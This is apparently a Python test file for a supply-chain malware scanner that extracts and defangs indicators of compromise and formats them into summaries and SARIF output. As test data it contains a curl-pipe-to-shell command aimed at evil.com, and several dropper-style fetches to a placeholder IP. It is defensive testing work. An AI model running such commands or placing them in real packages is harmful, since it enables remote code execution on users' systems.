"""Tests for IOC extraction and defanging in content-scan hits."""

from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
STATIC_SRC = ROOT / "vendor" / "chaintrap-static-scan" / "src"
CI_SRC = ROOT / "vendor" / "chaintrap-ci" / "src"
SCRIPTS = ROOT / "scripts"
for p in (STATIC_SRC, CI_SRC, SCRIPTS):
    if str(p) not in sys.path:
        sys.path.insert(0, str(p))

from chaintrap_ci.summary import _format_evidence_hit, format_summary_markdown  # noqa: E402
from chaintrap_static_scan.ioc_extract import (  # noqa: E402
    defang_domain,
    defang_ip,
    defang_url,
    enrich_content_hit,
    extract_artifacts,
    primary_artifact_label,
)
from chaintrap_static_scan.pattern_scanner import hits_to_dicts, PatternHit  # noqa: E402
from chaintrap_sarif import rollup_json_to_sarif  # noqa: E402


def test_defang_url_bracket_dot():
    assert defang_url("https://evil.com/path") == "hxxps://evil[.]com/path"
    assert defang_url("http://203.0.113.55/x") == "hxxp://203[.]0[.]113[.]55/x"


def test_defang_ip_and_domain():
    assert defang_ip("185.199.110.153") == "185[.]199[.]110[.]153"
    assert defang_domain("telemetry-cdn-sync.com") == "telemetry-cdn-sync[.]com"


def test_ctc_net001_extracts_url_and_ip():
    line = "require('https').get('https://203.0.113.55/payload')"
    arts = extract_artifacts(line, rule_id="CTC-NET001", category="DROPPER")
    assert arts["urls"] == ["hxxps://203[.]0[.]113[.]55/payload"]
    assert arts["ips"] == ["203[.]0[.]113[.]55"]


def test_ctc_ttp001_extracts_curl_command():
    line = "curl -s https://evil.com/stage.sh | sh"
    arts = extract_artifacts(line, rule_id="CTC-TTP001", category="INSTALL_HOOK")
    assert arts["urls"]
    assert "evil[.]com" in arts["urls"][0]
    assert arts["commands"]
    assert "curl" in arts["commands"][0].lower()


def test_benign_registry_url_filtered():
    line = "fetch('https://registry.npmjs.org/package')"
    arts = extract_artifacts(line, rule_id="CTC-NET001", category="DROPPER")
    assert arts["urls"] == []
    assert arts["domains"] == []


def test_hits_to_dicts_includes_artifacts():
    hits = hits_to_dicts(
        [
            PatternHit(
                rule_id="CTC-NET001",
                severity="HIGH",
                category="DROPPER",
                message="Outbound HTTP",
                file="pkg/index.js",
                line=10,
                snippet="require('https').get('https://203.0.113.55/x')",
            )
        ]
    )
    assert hits[0]["artifacts"]["urls"][0].startswith("hxxps://203")


def test_format_evidence_hit_shows_url_subbullet():
    hit = enrich_content_hit(
        {
            "rule_id": "CTC-NET001",
            "severity": "HIGH",
            "category": "DROPPER",
            "message": "Outbound HTTP to non-registry host",
            "file": "package/dist/index.d.ts",
            "line": 185,
            "snippet": "require('https').get('https://203.0.113.55/payload')",
        }
    )
    lines = _format_evidence_hit(hit)
    joined = "\n".join(lines)
    assert "**URL:**" in joined
    assert "203[.]0[.]113[.]55" in joined
    assert "Outbound HTTP" in joined


def test_summary_markdown_evidence_contains_defanged_url():
    rollup = {
        "bundle_id": "test-scan",
        "bundle_status": "complete",
        "items": [
            {
                "ecosystem": "npm",
                "package_spec": "evil-pkg@1.0.0",
                "summary": {
                    "verdict_level": "BLOCK",
                    "risk_score": 8.0,
                    "risk_tldr": "Suspicious network patterns.",
                    "top_evidence": [
                        enrich_content_hit(
                            {
                                "rule_id": "CTC-NET001",
                                "severity": "HIGH",
                                "category": "DROPPER",
                                "message": "Outbound HTTP",
                                "file": "index.js",
                                "line": 1,
                                "snippet": "fetch('https://203.0.113.55/x')",
                                "signal_tier": "block",
                            }
                        )
                    ],
                },
            }
        ],
    }
    blocked = [
        {
            "ecosystem": "npm",
            "package_spec": "evil-pkg@1.0.0",
            "summary": rollup["items"][0]["summary"],
            "_worst_severity": "HIGH",
        }
    ]
    md = format_summary_markdown(rollup, blocked=blocked, warned=[], gate_summary="mal=block")
    assert "**URL:**" in md
    assert "203[.]0[.]113[.]55" in md


def test_sarif_content_hit_includes_artifacts():
    rollup = {
        "items": [
            {
                "ecosystem": "npm",
                "package_spec": "evil@1.0.0",
                "summary": {
                    "content_findings": [
                        enrich_content_hit(
                            {
                                "rule_id": "CTC-NET001",
                                "severity": "HIGH",
                                "message": "Outbound HTTP",
                                "file": "a.js",
                                "line": 2,
                                "snippet": "get('https://203.0.113.55/x')",
                                "category": "DROPPER",
                            }
                        )
                    ],
                },
            }
        ],
    }
    sarif = rollup_json_to_sarif(rollup)
    results = sarif["runs"][0]["results"]
    content = [r for r in results if r.get("ruleId") == "CTC-NET001"]
    assert content
    assert "203[.]0[.]113[.]55" in content[0]["message"]["text"]
    assert content[0]["properties"]["artifacts"]["urls"]


def test_primary_artifact_label_prefers_url():
    arts = {"urls": ["hxxps://a[.]com"], "domains": [], "ips": [], "commands": []}
    assert primary_artifact_label(arts) == "hxxps://a[.]com"
